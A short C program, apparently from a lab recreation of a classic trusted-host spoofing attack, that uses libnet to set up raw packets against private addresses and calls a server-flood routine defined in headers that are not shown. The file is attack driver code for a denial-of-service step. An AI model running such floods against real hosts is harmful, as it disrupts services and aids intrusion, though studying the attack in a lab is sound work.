#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include "flood.h"
#include "sender.h"
int main() {

    //Defining variables
    u_long server;
    u_long xterminal;
    u_long kevin;

    libnet_t *l;  //Libnet Context

    char errbuf[LIBNET_ERRBUF_SIZE];

    l = libnet_init(LIBNET_RAW4, NULL, errbuf);

    if ( l == NULL ) {
    fprintf(stderr, "libnet initialization failed: %s\n", errbuf);
    exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);

    //Retrieving IP by conversion
    if((server=libnet_name2addr4(l,"172.16.45.3", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in server ip conversion");
        exit(0);
    }    
    if((xterminal=libnet_name2addr4(l,"172.16.45.4", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in xterminal ip conversion");
        exit(0);
    }
    if((kevin=libnet_name2addr4(l,"172.16.45.2", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in kevin ip conversion");
        exit(0);        
    };



    //Server flood

    disableServer(l,kevin,server);

    libnet_destroy(l);
    return 0;
    }